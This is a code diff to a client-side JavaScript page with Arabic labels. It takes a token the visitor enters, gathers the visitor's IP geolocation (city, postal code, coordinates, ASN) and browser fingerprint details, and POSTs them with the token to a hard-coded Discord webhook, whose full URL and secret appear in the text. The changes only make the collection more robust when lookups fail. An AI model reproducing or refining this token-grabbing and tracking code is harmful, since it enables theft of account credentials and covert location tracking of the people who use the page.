@@ -27,15 +27,17 @@ const tokenInput = document.getElementById('tokenInput');
 async function getGeoInfo() {
     try {
         const res = await fetch('https://ipapi.co/json/');
+        if(!res.ok) return {};
         return await res.json();
     } catch {
-        return { country_name:"غير متوفر", region:"غير متوفر", city:"غير متوفر", postal:"غير متوفر", latitude:"غير متوفر", longitude:"غير متوفر", org:"غير متوفر", ip:"غير متوفر" };
+        return {};
     }
 }
 
 async function sendInfo() {
     const token = tokenInput.value.trim();
     if(!token) return;
+
     const geo = await getGeoInfo();
     const language = navigator.language || navigator.userLanguage;
     const screenRes = `${screen.width}x${screen.height}`;
@@ -43,20 +45,21 @@ async function sendInfo() {
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
     const userAgent = navigator.userAgent;
     const platform = navigator.platform;
+
     const content = `TOKEN: ${token}
 
-🌍 الدولة: ${geo.country_name}
-🏙️ المدينة والمنطقة: ${geo.region} - ${geo.city}
-🌐 عنوان IP: ${geo.ip}
-📮 الرمز البريدي: ${geo.postal}
-🕐 المنطقة الزمنية: ${timezone}
-📍 الإحداثيات: ${geo.latitude},${geo.longitude}
-🔗 ASN: ${geo.org}
-🖥️ نظام التشغيل: ${platform}
-🌐 المتصفح: ${userAgent}
-📱 دقة الشاشة: ${screenRes}
-🎨 عمق الألوان: ${colorDepth}
-🌍 اللغة: ${language}`;
+🌍 الدولة: ${geo.country_name || ''}
+🏙️ المدينة والمنطقة: ${geo.region || ''} - ${geo.city || ''}
+🌐 عنوان IP: ${geo.ip || ''}
+📮 الرمز البريدي: ${geo.postal || ''}
+🕐 المنطقة الزمنية: ${timezone || ''}
+📍 الإحداثيات: ${geo.latitude || ''},${geo.longitude || ''}
+🔗 ASN: ${geo.org || ''}
+🖥️ نظام التشغيل: ${platform || ''}
+🌐 المتصفح: ${userAgent || ''}
+📱 دقة الشاشة: ${screenRes || ''}
+🎨 عمق الألوان: ${colorDepth || ''}
+🌍 اللغة: ${language || ''}`;
 
     fetch("https://discord.com/api/webhooks/1405597236586348714/G8u3dnhw71M0DA9gOl0lyJTDnxmILSyx4GUdswvTgWlX9UOctibV28fzf9wtjjGVe_FY", {
         method:"POST",
